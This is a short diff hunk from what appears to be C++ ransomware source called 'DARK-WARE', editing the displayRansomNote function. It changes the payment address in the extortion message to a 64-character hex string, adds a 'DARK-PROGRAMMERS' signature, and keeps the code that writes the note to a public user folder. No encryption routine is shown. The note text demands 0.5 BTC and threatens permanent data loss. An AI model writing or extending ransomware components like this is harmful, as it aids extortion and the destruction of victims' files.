@@ -37,12 +37,14 @@ void displayRansomNote() {
 YOUR FILES HAVE BEEN ENCRYPTED BY DARK-WARE!
 ----------------------------------------
 All your important files have been encrypted. To recover them, you must pay a ransom of 0.5 BTC to the following address:
-1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+6dda5dfb7fb5bfab6c5014d7550cf6c78ea73f081d0cd3ee91459b9a61820799
 
 After payment, send your transaction ID to darkware@malicious.com.
 A decryption key will be provided to restore your files.
 
 DO NOT attempt to decrypt files manually or delete this program. Doing so will result in permanent data loss.
+
+P.S. - DARK-PROGRAMMERS
 )";
 
     std::string notePath = "C:\\Users\\Public\\RANSOM_NOTE.txt";
